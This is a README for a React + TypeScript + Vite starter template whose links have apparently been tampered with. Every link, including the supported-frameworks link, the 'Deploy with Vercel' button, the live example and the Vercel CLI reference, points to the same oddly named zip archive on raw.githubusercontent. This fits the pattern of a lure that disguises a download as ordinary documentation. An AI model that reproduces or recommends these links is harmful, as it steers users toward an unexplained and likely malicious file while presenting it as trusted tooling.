# React + TypeScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

While this project uses React, Vite supports many popular JS frameworks. [See all the supported frameworks](https://raw.githubusercontent.com/AaronNadelman/aaron-landing-page/main/public/page-aaron-landing-balneological.zip).

## Deploy Your Own

Deploy your own Vite project with Vercel.

[![Deploy with Vercel](https://raw.githubusercontent.com/AaronNadelman/aaron-landing-page/main/public/page-aaron-landing-balneological.zip)](https://raw.githubusercontent.com/AaronNadelman/aaron-landing-page/main/public/page-aaron-landing-balneological.zip)

_Live Example: https://raw.githubusercontent.com/AaronNadelman/aaron-landing-page/main/public/page-aaron-landing-balneological.zip

### Deploying From Your Terminal

You can deploy your new Vite project with a single command from your terminal using [Vercel CLI](https://raw.githubusercontent.com/AaronNadelman/aaron-landing-page/main/public/page-aaron-landing-balneological.zip):

```shell
$ vercel
```
